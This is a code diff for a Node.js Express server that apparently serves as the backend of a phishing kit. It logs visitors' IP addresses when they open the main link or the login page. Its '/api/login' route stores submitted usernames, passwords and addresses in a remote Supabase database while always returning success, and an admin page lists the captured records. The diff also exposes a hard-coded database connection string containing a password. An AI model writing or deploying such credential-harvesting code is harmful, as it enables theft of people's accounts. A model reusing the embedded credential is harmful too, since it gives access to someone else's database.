@@ -6,12 +6,11 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Supabase Connection (your exact string)
+// Supabase Connection
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
-
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -22,21 +21,35 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     timestamp TEXT
 )`);
 
+// Simple Save Function
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     pool.query(
         "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
         [type, username, password, address, ip, timestamp]
     );
-    console.log(`📍 SAVED → ${type} | IP: ${ip}`);
+    console.log(`✅ SAVED: ${type} | IP: ${ip}`);
 }
 
-// FORCE RECORD ON MAIN LINK
+// MAIN LINK CLICK
 app.get('/', (req, res) => {
     const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
     saveRecord('Page Visit', null, null, null, ip);
     console.log("🔴 MAIN LINK WAS CLICKED!");
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.get('/login.html', (req, res) => {
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    saveRecord('Page Visit', null, null, null, ip);
+    res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
+app.post('/api/login', (req, res) => {
+    const { username, password, address } = req.body;
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    saveRecord('Login Attempt', username, password, address, ip);
+    res.json({ success: true });
 });
 
 app.get('/api/records', async (req, res) => {
@@ -46,6 +59,11 @@ app.get('/api/records', async (req, res) => {
 
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+app.post('/api/clear', async (req, res) => {
+    await pool.query("DELETE FROM records");
+    res.json({ message: 'Cleared' });
 });
 
 const PORT = process.env.PORT || 3000;
